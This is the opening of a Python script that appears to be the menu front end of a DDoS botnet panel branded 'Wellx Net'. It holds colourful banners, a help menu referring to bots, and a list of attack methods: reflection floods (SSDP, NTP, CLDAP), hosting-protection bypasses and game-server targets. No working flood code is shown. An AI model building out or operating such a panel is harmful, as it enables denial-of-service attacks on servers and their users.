#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json

nicknm = "WellzX"

methods = """
                              \x1b[1;37m  ╔╦╗ ┌─┐┌┬┐┬ ┬\x1b[33m┌─┐┌┬┐┌─┐
                               \x1b[1;37m ║║║ ├┤  │ ├─┤\x1b[33m│ │ ││└─┐
                               \x1b[1;37m ╩ ╩ └─┘ ┴ ┴ ┴\x1b[33m└─┘─┴┘└─┘
                     \x1b[37m═══════════════════\x1b[33m═════════════════════
    \x1b[37m╔═══════════════╗ ╔═══════════╩═══╗ \x1b[33m ╔══════╩════════╗ ╔═══════════════╗
    \x1b[37m║ SSDP          ╠═╣ ARD           ╠═\x1b[33m═╣ NTP           ╠═╣ UDP           ║
    \x1b[37m║ SNMP          ╠═╣ CLDAP         ╠═\x1b[33m═╣ HOME-HOLD     ╠═╣ STD           ║
    \x1b[37m╚═══════════════╝ ╚════╦════╦═════╝ \x1b[33m ╚═════╦════╦════╝ ╚═══════════════╝
            \x1b[37m╔══════════════╩╗  ╔╩═══════\x1b[33m═══════╩╗  ╔╩══════════════╗
            \x1b[37m║ TCP-PROXYv2   ╠══╣ PORT-KILL\x1b[33m      ╠══╣ ROBLOX        ║
           \x1b[37m╔╣ TCP-ABUSE     ╠══╣ FORTNITE\x1b[33m       ╠══╣ FIVEM         ╠╗
          \x1b[37m╔╝╚═══════════════╝  ╚════════\x1b[33m════════╝  ╚═══════════════╝╚╗
          \x1b[37m╚════════════════════╦════════\x1b[33m════════╦════════════════════╝
   \x1b[37m═════════╦═════════════════╦╩════════\x1b[33m════════╩╦═════════════════╦═════════
    \x1b[37m╔═══════╩═══════╗ ╔═══════╩═══════╗ \x1b[33m ╔═══════╩═══════╗ ╔═══════╩═══════╗
    \x1b[37m║ NFO-BYPASS    ╠═╣ 100UP         ╠═\x1b[33m═\x1b[33m╣ BROWSER       ╠═╣ HTTP-BYPASS   ║
    \x1b[37m║ OVH-TCP       ║ ║ OVH-UDP       ║ \x1b[33m ║ HTTPS         ║ ║ HTTP-GET      ║
    \x1b[37m║ HYDRA         ╠═╣ OVH-AMP       ╠═\x1b[33m═\x1b[33m╣ TLSv2         ╠═╣ HTTP-RAND     ║
    \x1b[37m╚═══════════════╝ ╚═══════════════╝ \x1b[33m ╚═══════════════╝ ╚═══════════════╝

 """

help = """
                \033[38;2;120;110;221m    ╔══════════════════════════════════════╗       
                \033[38;2;120;110;221m    ║        \033[1;37m        \033[31m🔥\033[1;97mHelp\033[31m🔥\033[1;97m \033[38;2;120;110;221m             ║       
                \033[38;2;120;110;221m╔═══╩══════════════════════════════════════╩═══╗   
                \033[38;2;120;110;221m║ \033[1;37mMETHODS -  SHOWS ALL METHODS           \033[38;2;120;110;221m      ║   
                \033[38;2;120;110;221m║\033[1;37m CREDIT -  SHOWS THE DEVS OF ASTRO      \033[38;2;120;110;221m      ║   
                \033[38;2;120;110;221m║ \033[1;37mBOTS -  SHOWS BOTS AND ARCHS           \033[38;2;120;110;221m      ║   
                \033[38;2;120;110;221m║ \033[1;37mRULES -  READ IF YOU DONT WANT A BAN   \033[38;2;120;110;221m      ║   
                \033[38;2;120;110;221m║ \033[1;37mCLS -  CLEARS THE SCREEN               \033[38;2;120;110;221m      ║   
                \033[38;2;120;110;221m║ \033[1;37mLOGOUT -  EXITS FROM THE NET           \033[38;2;120;110;221m      ║   
                \033[38;2;120;110;221m╚══════════════════════════════════════════════╝   
                

"""


banner =  """
                                  \x1b[37m╔╦╗ ╔═╗ ╔╦╗ \x1b[31m╔═╗ ╔╗╔ ╦ ╔═╗  
                                   \x1b[37m║║ ║╣  ║║║ \x1b[31m║ ║ ║║║ ║ ║    
                                  \x1b[37m═╩╝ ╚═╝ ╩ ╩ \x1b[31m╚═╝ ╝╚╝ ╩ ╚═╝
    \033[0m\033[38;2;180;54;165m \033[0m\033[38;2;178;57;167m \033[0m\033[38;2;176;60;170m \033[0m\033[38;2;175;63;173m \033[0m\033[38;2;173;67;176m \033[0m\033[38;2;171;70;179m \033[0m\033[38;2;170;73;182m.\033[0m\033[38;2;168;76;185m \033[0m\033[38;2;166;79;187m \033[0m\033[38;2;164;82;190m \033[0m\033[38;2;163;85;193m \033[0m\033[38;2;161;88;196m \033[0m\033[38;2;159;91;199m \033[0m\033[38;2;157;94;202m \033[0m\033[38;2;156;97;205m \033[0m\033[38;2;154;100;208m \033[0m\033[38;2;152;103;210m╚\033[0m\033[38;2;150;106;213m╦\033[0m\033[38;2;149;109;216m═\033[0m\033[38;2;147;112;219m═\033[0m\033[38;2;144;112;219m═\033[0m\033[38;2;142;112;219m═\033[0m\033[38;2;139;111;220m═\033[0m\033[38;2;136;111;220m═\033[0m\033[38;2;133;111;220m═\033[0m\033[38;2;131;111;220m═\033[0m\033[38;2;128;110;220m═\033[0m\033[38;2;125;110;221m═\033[0m\033[38;2;122;110;221m═\033[0m\033[38;2;120;110;221m═\033[0m\033[38;2;117;109;221m═\033[0m\033[38;2;114;109;221m═\033[0m\033[38;2;111;109;222m═\033[0m\033[38;2;109;109;222m═\033[0m\033[38;2;106;109;222m═\033[0m\033[38;2;103;108;222m═\033[0m\033[38;2;101;108;222m═\033[0m\033[38;2;98;108;223m═\033[0m\033[38;2;95;108;223m═\033[0m\033[38;2;92;107;223m═\033[0m\033[38;2;90;107;223m═\033[0m\033[38;2;87;107;223m═\033[0m\033[38;2;84;107;224m═\033[0m\033[38;2;81;106;224m═\033[0m\033[38;2;79;106;224m═\033[0m\033[38;2;76;106;224m═\033[0m\033[38;2;73;106;224m═\033[0m\033[38;2;70;105;225m═\033[0m\033[38;2;68;105;225m═\033[0m\033[38;2;65;105;225m═\033[0m\033[38;2;63;110;226m═\033[0m\033[38;2;61;115;227m═\033[0m\033[38;2;59;120;228m═\033[0m\033[38;2;56;125;229m═\033[0m\033[38;2;54;130;230m═\033[0m\033[38;2;52;135;231m═\033[0m\033[38;2;50;140;232m═\033[0m\033[38;2;48;145;233m═\033[0m\033[38;2;45;150;234m═\033[0m\033[38;2;43;155;235m═\033[0m\033[38;2;41;160;236m═\033[0m\033[38;2;39;165;237m═\033[0m\033[38;2;37;170;238m═\033[0m\033[38;2;35;175;239m═\033[0m\033[38;2;32;180;240m╦\033[0m\033[38;2;30;185;241m╝\033[0m\033[38;2;28;190;242m \033[0m
    \033[0m\033[38;2;180;54;165m \033[0m\033[38;2;178;57;167m \033[0m\033[38;2;176;60;170m \033[0m\033[38;2;175;63;173m \033[0m\033[38;2;173;67;176m \033[0m\033[38;2;171;70;179m \033[0m\033[38;2;170;73;182m \033[0m\033[38;2;168;76;185m \033[0m\033[38;2;166;79;187m \033[0m\033[38;2;164;82;190m \033[0m\033[38;2;163;85;193m \033[0m\033[38;2;161;88;196m \033[0m\033[38;2;159;91;199m \033[0m\033[38;2;157;94;202m \033[0m\033[38;2;156;97;205m \033[0m\033[38;2;154;100;208m \033[0m\033[38;2;152;103;210m \033[0m\033[38;2;150;106;213m║\033[0m\033[38;2;149;109;216m-\033[0m\033[38;2;147;112;219m \033[0m\033[38;2;144;112;219m-\033[0m\033[38;2;142;112;219m \033[0m\033[38;2;139;111;220m-\033[0m\033[38;2;136;111;220m \033[0m\033[38;2;133;111;220m-\033[0m\033[38;2;131;111;220m \033[0m\033[38;2;128;110;220m-\033[0m\033[38;2;125;110;221m \033[0m\033[38;2;122;110;221m▪\033[0m\033[38;2;120;110;221m \033[0m\033[38;2;117;109;221m \033[0m\033[38;2;114;109;221mW\033[0m\033[38;2;111;109;222me\033[0m\033[38;2;109;109;222ml\033[0m\033[38;2;106;109;222mc\033[0m\033[38;2;103;108;222mo\033[0m\033[38;2;101;108;222mm\033[0m\033[38;2;98;108;223me\033[0m\033[38;2;95;108;223m \033[0m\033[38;2;92;107;223mT\033[0m\033[38;2;90;107;223mo\033[0m\033[38;2;87;107;223m \033[0m\033[38;2;84;107;224mW\033[0m\033[38;2;81;106;224me\033[0m\033[38;2;79;106;224ml\033[0m\033[38;2;76;106;224ml\033[0m\033[38;2;73;106;224mx\033[0m\033[38;2;70;105;225m \033[0m\033[38;2;68;105;225mN\033[0m\033[38;2;65;105;225me\033[0m\033[38;2;63;110;226mt\033[0m\033[38;2;61;115;227m!\033[0m\033[38;2;59;120;228m \033[0m\033[38;2;56;125;229m▪\033[0m\033[38;2;54;130;230m \033[0m\033[38;2;52;135;231m-\033[0m\033[38;2;50;140;232m \033[0m\033[38;2;48;145;233m-\033[0m\033[38;2;45;150;234m \033[0m\033[38;2;43;155;235m-\033[0m\033[38;2;41;160;236m \033[0m\033[38;2;39;165;237m-\033[0m\033[38;2;37;170;238m \033[0m\033[38;2;35;175;239m-\033[0m\033[38;2;32;180;240m║\033[0m\033[38;2;30;185;241m \033[0m\033[38;2;28;190;242m \033[0m\033[38;2;26;195;243m \033[0m\033[38;2;24;200;244m·\033[0m\033[38;2;22;205;245m \033[0m
    \033[0m\033[38;2;180;54;165m \033[0m\033[38;2;178;57;167m \033[0m\033[38;2;176;60;170m \033[0m\033[38;2;175;63;173m \033[0m\033[38;2;173;67;176m \033[0m\033[38;2;171;70;179m \033[0m\033[38;2;170;73;182m \033[0m\033[38;2;168;76;185m \033[0m\033[38;2;166;79;187m \033[0m\033[38;2;164;82;190m \033[0m\033[38;2;163;85;193m \033[0m\033[38;2;161;88;196m \033[0m\033[38;2;159;91;199m.\033[0m\033[38;2;157;94;202m \033[0m\033[38;2;156;97;205m \033[0m\033[38;2;154;100;208m \033[0m\033[38;2;152;103;210m \033[0m\033[38;2;150;106;213m║\033[0m\033[38;2;149;109;216m▪\033[0m\033[38;2;147;112;219m \033[0m\033[38;2;144;112;219mC\033[0m\033[38;2;142;112;219mE\033[0m\033[38;2;139;111;220mO\033[0m\033[38;2;136;111;220m-\033[0m\033[38;2;133;111;220mF\033[0m\033[38;2;131;111;220mo\033[0m\033[38;2;128;110;220mu\033[0m\033[38;2;125;110;221mn\033[0m\033[38;2;122;110;221md\033[0m\033[38;2;120;110;221me\033[0m\033[38;2;117;109;221mr\033[0m\033[38;2;114;109;221m \033[0m\033[38;2;111;109;222m@\033[0m\033[38;2;109;109;222mW\033[0m\033[38;2;106;109;222me\033[0m\033[38;2;103;108;222ml\033[0m\033[38;2;101;108;222ml\033[0m\033[38;2;98;108;223ml\033[0m\033[38;2;95;108;223mz\033[0m\033[38;2;92;107;223ms\033[0m\033[38;2;90;107;223mX\033[0m\033[38;2;87;107;223m \033[0m\033[38;2;84;107;224m|\033[0m\033[38;2;81;106;224m \033[0m\033[38;2;79;106;224mP\033[0m\033[38;2;76;106;224mo\033[0m\033[38;2;73;106;224mw\033[0m\033[38;2;70;105;225me\033[0m\033[38;2;68;105;225mr\033[0m\033[38;2;65;105;225me\033[0m\033[38;2;63;110;226md\033[0m\033[38;2;61;115;227m \033[0m\033[38;2;59;120;228mB\033[0m\033[38;2;56;125;229my\033[0m\033[38;2;54;130;230m \033[0m\033[38;2;52;135;231mS\033[0m\033[38;2;50;140;232mt\033[0m\033[38;2;48;145;233mo\033[0m\033[38;2;45;150;234mo\033[0m\033[38;2;43;155;235mr\033[0m\033[38;2;41;160;236mm\033[0m\033[38;2;39;165;237m.\033[0m\033[38;2;37;170;238m \033[0m\033[38;2;35;175;239m▪\033[0m\033[38;2;32;180;240m║\033[0m\033[38;2;30;185;241m \033[0m
    \033[0m\033[38;2;180;54;165m \033[0m\033[38;2;178;57;167m \033[0m\033[38;2;176;60;170m \033[0m\033[38;2;175;63;173m \033[0m\033[38;2;173;67;176m \033[0m\033[38;2;171;70;179m \033[0m\033[38;2;170;73;182m \033[0m\033[38;2;168;76;185m \033[0m\033[38;2;166;79;187m \033[0m\033[38;2;164;82;190m \033[0m\033[38;2;163;85;193m \033[0m\033[38;2;161;88;196m \033[0m\033[38;2;159;91;199m \033[0m\033[38;2;157;94;202m \033[0m\033[38;2;156;97;205m╚\033[0m\033[38;2;154;100;208m═\033[0m\033[38;2;152;103;210m╦\033[0m\033[38;2;150;106;213m╩\033[0m\033[38;2;149;109;216m═\033[0m\033[38;2;147;112;219m═\033[0m\033[38;2;144;112;219m═\033[0m\033[38;2;142;112;219m═\033[0m\033[38;2;139;111;220m═\033[0m\033[38;2;136;111;220m═\033[0m\033[38;2;133;111;220m═\033[0m\033[38;2;131;111;220m═\033[0m\033[38;2;128;110;220m═\033[0m\033[38;2;125;110;221m═\033[0m\033[38;2;122;110;221m═\033[0m\033[38;2;120;110;221m═\033[0m\033[38;2;117;109;221m═\033[0m\033[38;2;114;109;221m═\033[0m\033[38;2;111;109;222m═\033[0m\033[38;2;109;109;222m═\033[0m\033[38;2;106;109;222m═\033[0m\033[38;2;103;108;222m═\033[0m\033[38;2;101;108;222m═\033[0m\033[38;2;98;108;223m═\033[0m\033[38;2;95;108;223m═\033[0m\033[38;2;92;107;223m═\033[0m\033[38;2;90;107;223m═\033[0m\033[38;2;87;107;223m═\033[0m\033[38;2;84;107;224m═\033[0m\033[38;2;81;106;224m═\033[0m\033[38;2;79;106;224m═\033[0m\033[38;2;76;106;224m═\033[0m\033[38;2;73;106;224m═\033[0m\033[38;2;70;105;225m═\033[0m\033[38;2;68;105;225m═\033[0m\033[38;2;65;105;225m═\033[0m\033[38;2;63;110;226m═\033[0m\033[38;2;61;115;227m═\033[0m\033[38;2;59;120;228m═\033[0m\033[38;2;56;125;229m═\033[0m\033[38;2;54;130;230m═\033[0m\033[38;2;52;135;231m═\033[0m\033[38;2;50;140;232m═\033[0m\033[38;2;48;145;233m═\033[0m\033[38;2;45;150;234m═\033[0m\033[38;2;43;155;235m═\033[0m\033[38;2;41;160;236m═\033[0m\033[38;2;39;165;237m═\033[0m\033[38;2;37;170;238m═\033[0m\033[38;2;35;175;239m═\033[0m\033[38;2;32;180;240m╩\033[0m\033[38;2;30;185;241m╦\033[0m\033[38;2;28;190;242m═\033[0m\033[38;2;26;195;243m╝\033[0m\033[38;2;24;200;244m \033[0m\033[38;2;22;205;245m \033[0m\033[38;2;19;210;246m \033[0m\033[38;2;17;215;247m \033[0m\033[38;2;15;220;248m \033[0m\033[38;2;13;225;249m \033[0m\033[38;2;11;230;250m \033[0m\033[38;2;9;235;251m \033[0m\033[38;2;6;240;252m \033[0m\033[38;2;4;245;253m \033[0m\033[38;2;2;250;254m.\033[0m\033[38;2;0;255;255m \033[0m
    \033[0m\033[38;2;180;54;165m \033[0m\033[38;2;178;57;167m \033[0m\033[38;2;176;60;170m \033[0m\033[38;2;175;63;173m \033[0m\033[38;2;173;67;176m \033[0m\033[38;2;171;70;179m \033[0m\033[38;2;170;73;182m \033[0m\033[38;2;168;76;185m \033[0m\033[38;2;166;79;187m \033[0m\033[38;2;164;82;190m \033[0m\033[38;2;163;85;193m \033[0m\033[38;2;161;88;196m╚\033[0m\033[38;2;159;91;199m╦\033[0m\033[38;2;157;94;202m═\033[0m\033[38;2;156;97;205m═\033[0m\033[38;2;154;100;208m═\033[0m\033[38;2;152;103;210m╩\033[0m\033[38;2;150;106;213m═\033[0m\033[38;2;149;109;216m═\033[0m\033[38;2;147;112;219m═\033[0m\033[38;2;144;112;219m═\033[0m\033[38;2;142;112;219m═\033[0m\033[38;2;139;111;220m═\033[0m\033[38;2;136;111;220m═\033[0m\033[38;2;133;111;220m═\033[0m\033[38;2;131;111;220m═\033[0m\033[38;2;128;110;220m═\033[0m\033[38;2;125;110;221m═\033[0m\033[38;2;122;110;221m═\033[0m\033[38;2;120;110;221m═\033[0m\033[38;2;117;109;221m═\033[0m\033[38;2;114;109;221m═\033[0m\033[38;2;111;109;222m═\033[0m\033[38;2;109;109;222m═\033[0m\033[38;2;106;109;222m═\033[0m\033[38;2;103;108;222m═\033[0m\033[38;2;101;108;222m═\033[0m\033[38;2;98;108;223m═\033[0m\033[38;2;95;108;223m═\033[0m\033[38;2;92;107;223m═\033[0m\033[38;2;90;107;223m═\033[0m\033[38;2;87;107;223m═\033[0m\033[38;2;84;107;224m═\033[0m\033[38;2;81;106;224m═\033[0m\033[38;2;79;106;224m═\033[0m\033[38;2;76;106;224m═\033[0m\033[38;2;73;106;224m═\033[0m\033[38;2;70;105;225m═\033[0m\033[38;2;68;105;225m═\033[0m\033[38;2;65;105;225m═\033[0m\033[38;2;63;110;226m═\033[0m\033[38;2;61;115;227m═\033[0m\033[38;2;59;120;228m═\033[0m\033[38;2;56;125;229m═\033[0m\033[38;2;54;130;230m═\033[0m\033[38;2;52;135;231m═\033[0m\033[38;2;50;140;232m═\033[0m\033[38;2;48;145;233m═\033[0m\033[38;2;45;150;234m═\033[0m\033[38;2;43;155;235m═\033[0m\033[38;2;41;160;236m═\033[0m\033[38;2;39;165;237m═\033[0m\033[38;2;37;170;238m═\033[0m\033[38;2;35;175;239m═\033[0m\033[38;2;32;180;240m═\033[0m\033[38;2;30;185;241m╩\033[0m\033[38;2;28;190;242m═\033[0m\033[38;2;26;195;243m═\033[0m\033[38;2;24;200;244m═\033[0m\033[38;2;22;205;245m╦\033[0m\033[38;2;19;210;246m╝\033[0m
    \033[0m\033[38;2;180;54;165m \033[0m\033[38;2;178;57;167m \033[0m\033[38;2;176;60;170m \033[0m\033[38;2;175;63;173m.\033[0m\033[38;2;173;67;176m \033[0m\033[38;2;171;70;179m \033[0m\033[38;2;170;73;182m \033[0m\033[38;2;168;76;185m \033[0m\033[38;2;166;79;187m \033[0m\033[38;2;164;82;190m \033[0m\033[38;2;163;85;193m \033[0m\033[38;2;161;88;196m \033[0m\033[38;2;159;91;199m║\033[0m\033[38;2;157;94;202m \033[0m\033[38;2;156;97;205m-\033[0m\033[38;2;154;100;208m \033[0m\033[38;2;152;103;210m-\033[0m\033[38;2;150;106;213m \033[0m\033[38;2;149;109;216m-\033[0m\033[38;2;147;112;219m \033[0m\033[38;2;144;112;219m-\033[0m\033[38;2;142;112;219m▪\033[0m\033[38;2;139;111;220m \033[0m\033[38;2;136;111;220mY\033[0m\033[38;2;133;111;220mo\033[0m\033[38;2;131;111;220mu\033[0m\033[38;2;128;110;220mr\033[0m\033[38;2;125;110;221m \033[0m\033[38;2;122;110;221mC\033[0m\033[38;2;120;110;221mo\033[0m\033[38;2;117;109;221mn\033[0m\033[38;2;114;109;221mn\033[0m\033[38;2;111;109;222me\033[0m\033[38;2;109;109;222mc\033[0m\033[38;2;106;109;222mt\033[0m\033[38;2;103;108;222me\033[0m\033[38;2;101;108;222md\033[0m\033[38;2;98;108;223m \033[0m\033[38;2;95;108;223mU\033[0m\033[38;2;92;107;223mn\033[0m\033[38;2;90;107;223md\033[0m\033[38;2;87;107;223me\033[0m\033[38;2;84;107;224mr\033[0m\033[38;2;81;106;224m \033[0m\033[38;2;79;106;224mV\033[0m\033[38;2;76;106;224me\033[0m\033[38;2;73;106;224mr\033[0m\033[38;2;70;105;225ms\033[0m\033[38;2;68;105;225mi\033[0m\033[38;2;65;105;225mo\033[0m\033[38;2;63;110;226mn\033[0m\033[38;2;61;115;227m:\033[0m\033[38;2;59;120;228m \033[0m\033[38;2;56;125;229m<\033[0m\033[38;2;54;130;230mv\033[0m\033[38;2;52;135;231m1\033[0m\033[38;2;50;140;232m.\033[0m\033[38;2;48;145;233m0\033[0m\033[38;2;45;150;234m>\033[0m\033[38;2;43;155;235m \033[0m\033[38;2;41;160;236m▪\033[0m\033[38;2;39;165;237m-\033[0m\033[38;2;37;170;238m \033[0m\033[38;2;35;175;239m-\033[0m\033[38;2;32;180;240m \033[0m\033[38;2;30;185;241m-\033[0m\033[38;2;28;190;242m \033[0m\033[38;2;26;195;243m-\033[0m\033[38;2;24;200;244m \033[0m\033[38;2;22;205;245m║\033[0m
    \033[0m\033[38;2;180;54;165m \033[0m\033[38;2;178;57;167m \033[0m\033[38;2;176;60;170m \033[0m\033[38;2;175;63;173m \033[0m\033[38;2;173;67;176m \033[0m\033[38;2;171;70;179m \033[0m\033[38;2;170;73;182m \033[0m\033[38;2;168;76;185m \033[0m\033[38;2;166;79;187m \033[0m\033[38;2;164;82;190m \033[0m\033[38;2;163;85;193m \033[0m\033[38;2;161;88;196m \033[0m\033[38;2;159;91;199m║\033[0m\033[38;2;157;94;202m \033[0m\033[38;2;156;97;205m \033[0m\033[38;2;154;100;208m-\033[0m\033[38;2;152;103;210m \033[0m\033[38;2;150;106;213m-\033[0m\033[38;2;149;109;216m \033[0m\033[38;2;147;112;219m-\033[0m\033[38;2;144;112;219m \033[0m\033[38;2;142;112;219m-\033[0m\033[38;2;139;111;220m \033[0m\033[38;2;136;111;220m-\033[0m\033[38;2;133;111;220m \033[0m\033[38;2;131;111;220m▪\033[0m\033[38;2;128;110;220m \033[0m\033[38;2;125;110;221mP\033[0m\033[38;2;122;110;221mu\033[0m\033[38;2;120;110;221mt\033[0m\033[38;2;117;109;221m \033[0m\033[38;2;114;109;221m[\033[0m\033[38;2;111;109;222mH\033[0m\033[38;2;109;109;222mE\033[0m\033[38;2;106;109;222mL\033[0m\033[38;2;103;108;222mP\033[0m\033[38;2;101;108;222m]\033[0m\033[38;2;98;108;223m \033[0m\033[38;2;95;108;223mF\033[0m\033[38;2;92;107;223mo\033[0m\033[38;2;90;107;223mr\033[0m\033[38;2;87;107;223m \033[0m\033[38;2;84;107;224mA\033[0m\033[38;2;81;106;224ml\033[0m\033[38;2;79;106;224ml\033[0m\033[38;2;76;106;224m \033[0m\033[38;2;73;106;224mC\033[0m\033[38;2;70;105;225mo\033[0m\033[38;2;68;105;225mm\033[0m\033[38;2;65;105;225mm\033[0m\033[38;2;63;110;226ma\033[0m\033[38;2;61;115;227mn\033[0m\033[38;2;59;120;228md\033[0m\033[38;2;56;125;229ms\033[0m\033[38;2;54;130;230m \033[0m\033[38;2;52;135;231m▪\033[0m\033[38;2;50;140;232m \033[0m\033[38;2;48;145;233m-\033[0m\033[38;2;45;150;234m \033[0m\033[38;2;43;155;235m-\033[0m\033[38;2;41;160;236m \033[0m\033[38;2;39;165;237m-\033[0m\033[38;2;37;170;238m \033[0m\033[38;2;35;175;239m-\033[0m\033[38;2;32;180;240m \033[0m\033[38;2;30;185;241m-\033[0m\033[38;2;28;190;242m \033[0m\033[38;2;26;195;243m-\033[0m\033[38;2;24;200;244m \033[0m\033[38;2;22;205;245m║\033[0m
    \033[0m\033[38;2;180;54;165m \033[0m\033[38;2;178;57;167m \033[0m\033[38;2;176;60;170m \033[0m\033[38;2;175;63;173m \033[0m\033[38;2;173;67;176m \033[0m\033[38;2;171;70;179m.\033[0m\033[38;2;170;73;182m \033[0m\033[38;2;168;76;185m \033[0m\033[38;2;166;79;187m \033[0m\033[38;2;164;82;190m \033[0m\033[38;2;163;85;193m╚\033[0m\033[38;2;161;88;196m═\033[0m\033[38;2;159;91;199m╩\033[0m\033[38;2;157;94;202m═\033[0m\033[38;2;156;97;205m═\033[0m\033[38;2;154;100;208m═\033[0m\033[38;2;152;103;210m═\033[0m\033[38;2;150;106;213m═\033[0m\033[38;2;149;109;216m═\033[0m\033[38;2;147;112;219m═\033[0m\033[38;2;144;112;219m═\033[0m\033[38;2;142;112;219m═\033[0m\033[38;2;139;111;220m═\033[0m\033[38;2;136;111;220m═\033[0m\033[38;2;133;111;220m═\033[0m\033[38;2;131;111;220m═\033[0m\033[38;2;128;110;220m═\033[0m\033[38;2;125;110;221m═\033[0m\033[38;2;122;110;221m═\033[0m\033[38;2;120;110;221m═\033[0m\033[38;2;117;109;221m═\033[0m\033[38;2;114;109;221m═\033[0m\033[38;2;111;109;222m═\033[0m\033[38;2;109;109;222m═\033[0m\033[38;2;106;109;222m═\033[0m\033[38;2;103;108;222m═\033[0m\033[38;2;101;108;222m═\033[0m\033[38;2;98;108;223m═\033[0m\033[38;2;95;108;223m═\033[0m\033[38;2;92;107;223m═\033[0m\033[38;2;90;107;223m═\033[0m\033[38;2;87;107;223m═\033[0m\033[38;2;84;107;224m═\033[0m\033[38;2;81;106;224m═\033[0m\033[38;2;79;106;224m═\033[0m\033[38;2;76;106;224m═\033[0m\033[38;2;73;106;224m═\033[0m\033[38;2;70;105;225m═\033[0m\033[38;2;68;105;225m═\033[0m\033[38;2;65;105;225m═\033[0m\033[38;2;63;110;226m═\033[0m\033[38;2;61;115;227m═\033[0m\033[38;2;59;120;228m═\033[0m\033[38;2;56;125;229m═\033[0m\033[38;2;54;130;230m═\033[0m\033[38;2;52;135;231m═\033[0m\033[38;2;50;140;232m═\033[0m\033[38;2;48;145;233m═\033[0m\033[38;2;45;150;234m═\033[0m\033[38;2;43;155;235m═\033[0m\033[38;2;41;160;236m═\033[0m\033[38;2;39;165;237m═\033[0m\033[38;2;37;170;238m═\033[0m\033[38;2;35;175;239m═\033[0m\033[38;2;32;180;240m═\033[0m\033[38;2;30;185;241m═\033[0m\033[38;2;28;190;242m═\033[0m\033[38;2;26;195;243m═\033[0m\033[38;2;24;200;244m═\033[0m\033[38;2;22;205;245m╩\033[0m\033[38;2;19;210;246m═\033[0m\033[38;2;17;215;247m╝\033[0m\033[38;2;15;220;248m \033[0m\033[38;2;13;225;249m \033[0m\033[38;2;11;230;250m \033[0m\033[38;2;9;235;251m \033[0m\033[38;2;6;240;252m \033[0m\033[38;2;4;245;253m.\033[0m
    \033[0m\033[38;2;180;54;165m \033[0m\033[38;2;178;57;167m \033[0m\033[38;2;176;60;170m \033[0m\033[38;2;175;63;173m \033[0m\033[38;2;173;67;176m \033[0m\033[38;2;171;70;179m \033[0m\033[38;2;170;73;182m \033[0m\033[38;2;168;76;185m \033[0m\033[38;2;166;79;187m \033[0m\033[38;2;164;82;190m \033[0m\033[38;2;163;85;193m \033[0m\033[38;2;161;88;196m \033[0m\033[38;2;159;91;199m \033[0m\033[38;2;157;94;202m \033[0m\033[38;2;156;97;205m \033[0m\033[38;2;154;100;208m \033[0m\033[38;2;152;103;210m \033[0m\033[38;2;150;106;213m \033[0m\033[38;2;149;109;216m \033[0m\033[38;2;147;112;219m \033[0m\033[38;2;144;112;219m \033[0m\033[38;2;142;112;219m \033[0m\033[38;2;139;111;220m \033[0m\033[38;2;136;111;220m╔\033[0m\033[38;2;133;111;220m═\033[0m\033[38;2;131;111;220m═\033[0m\033[38;2;128;110;220m═\033[0m\033[38;2;125;110;221m═\033[0m\033[38;2;122;110;221m═\033[0m\033[38;2;120;110;221m═\033[0m\033[38;2;117;109;221m═\033[0m\033[38;2;114;109;221m═\033[0m\033[38;2;111;109;222m═\033[0m\033[38;2;109;109;222m═\033[0m\033[38;2;106;109;222m═\033[0m\033[38;2;103;108;222m═\033[0m\033[38;2;101;108;222m═\033[0m\033[38;2;98;108;223m═\033[0m\033[38;2;95;108;223m═\033[0m\033[38;2;92;107;223m═\033[0m\033[38;2;90;107;223m═\033[0m\033[38;2;87;107;223m═\033[0m\033[38;2;84;107;224m═\033[0m\033[38;2;81;106;224m═\033[0m\033[38;2;79;106;224m═\033[0m\033[38;2;76;106;224m═\033[0m\033[38;2;73;106;224m═\033[0m\033[38;2;70;105;225m═\033[0m\033[38;2;68;105;225m═\033[0m\033[38;2;65;105;225m═\033[0m\033[38;2;63;110;226m═\033[0m\033[38;2;61;115;227m═\033[0m\033[38;2;59;120;228m═\033[0m\033[38;2;56;125;229m═\033[0m\033[38;2;54;130;230m═\033[0m\033[38;2;52;135;231m═\033[0m\033[38;2;50;140;232m═\033[0m\033[38;2;48;145;233m═\033[0m\033[38;2;45;150;234m═\033[0m\033[38;2;43;155;235m╗\033[0m
    \033[0m\033[38;2;180;54;165m \033[0m\033[38;2;178;57;167m \033[0m\033[38;2;176;60;170m \033[0m\033[38;2;175;63;173m \033[0m\033[38;2;173;67;176m \033[0m\033[38;2;171;70;179m \033[0m\033[38;2;170;73;182m \033[0m\033[38;2;168;76;185m \033[0m\033[38;2;166;79;187m \033[0m\033[38;2;164;82;190m \033[0m\033[38;2;163;85;193m \033[0m\033[38;2;161;88;196m \033[0m\033[38;2;159;91;199m \033[0m\033[38;2;157;94;202m \033[0m\033[38;2;156;97;205m \033[0m\033[38;2;154;100;208m \033[0m\033[38;2;152;103;210m \033[0m\033[38;2;150;106;213m \033[0m\033[38;2;149;109;216m \033[0m\033[38;2;147;112;219m \033[0m\033[38;2;144;112;219m \033[0m\033[38;2;142;112;219m \033[0m\033[38;2;139;111;220m \033[0m\033[38;2;136;111;220m║\033[0m\033[38;2;133;111;220m.\033[0m\033[38;2;131;111;220m \033[0m\033[38;2;128;110;220mJ\033[0m\033[38;2;125;110;221mo\033[0m\033[38;2;122;110;221mi\033[0m\033[38;2;120;110;221mn\033[0m\033[38;2;117;109;221m \033[0m\033[38;2;114;109;221mS\033[0m\033[38;2;111;109;222me\033[0m\033[38;2;109;109;222mr\033[0m\033[38;2;106;109;222mv\033[0m\033[38;2;103;108;222me\033[0m\033[38;2;101;108;222mr\033[0m\033[38;2;98;108;223m:\033[0m\033[38;2;95;108;223m \033[0m\033[38;2;92;107;223md\033[0m\033[38;2;90;107;223mi\033[0m\033[38;2;87;107;223ms\033[0m\033[38;2;84;107;224mc\033[0m\033[38;2;81;106;224mo\033[0m\033[38;2;79;106;224mr\033[0m\033[38;2;76;106;224md\033[0m\033[38;2;73;106;224m.\033[0m\033[38;2;70;105;225mi\033[0m\033[38;2;68;105;225mo\033[0m\033[38;2;65;105;225m/\033[0m\033[38;2;63;110;226mf\033[0m\033[38;2;61;115;227ma\033[0m\033[38;2;59;120;228me\033[0m\033[38;2;56;125;229my\033[0m\033[38;2;54;130;230ma\033[0m\033[38;2;52;135;231mk\033[0m\033[38;2;50;140;232mo\033[0m\033[38;2;48;145;233m \033[0m\033[38;2;45;150;234m.\033[0m\033[38;2;43;155;235m║\033[0m
